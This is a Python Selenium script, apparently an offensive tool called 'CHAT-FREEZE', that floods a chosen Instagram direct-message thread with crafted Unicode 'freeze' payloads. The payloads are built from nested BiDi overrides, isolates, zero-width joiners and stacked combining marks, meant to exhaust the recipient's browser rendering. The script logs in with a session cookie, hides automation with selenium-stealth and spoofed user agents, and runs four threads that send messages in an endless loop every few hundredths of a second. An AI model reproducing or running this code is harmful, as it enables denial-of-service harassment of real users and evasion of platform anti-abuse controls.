# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (CHAT-FREEZE V76)
# 📅 STATUS: COMPOSITOR-LOCK | 4-AGENT TOTAL | AWS-HARD-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ VELOCITY & FREEZE CONFIG ---
AGENTS_PER_MACHINE = 4             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-Velocity Strike
REST_AFTER_STRIKES = 500   
REST_DURATION = 1          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_chat_freeze_payload():
    """Generates a payload that targets the GPU's Command Buffer and Render Tree."""
    u_id = random.randint(100, 999)
    # \u202D = BDO (BiDi Override) | \u2068 = FSI (Isolate)
    # \u034F = CGJ (Combining Joiner) | \u200D = ZWJ
    bdo, fsi, pdi, cgj, zwj = "\u202D", "\u2068", "\u2069", "\u034F", "\u200D"
    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) # Stacking marks
    glue = "\u2060" 
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [TOTAL_STUCK:{u_id}]"
    
    body = []
    # 450 lines - Absolute limit of the Instagram Socket
    for i in range(450):
        # We create a 'Depth Bomb'. 
        # Nesting BDO inside FSI forces the browser to create a new layer 
        # for every word. This exhausts the GPU's Layer Tree.
        line = f"{fsi}{bdo}P{marks}R{marks}A{marks}V{marks}EER{cgj}{zwj*4}{pdi}"
        body.append(f"{line} 👑 {i}{glue*5}")
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection with hardware-event spoofing."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_chat_freeze_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Freeze-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 150 == 0:
                        driver.refresh()
                        time.sleep(8)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(3)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
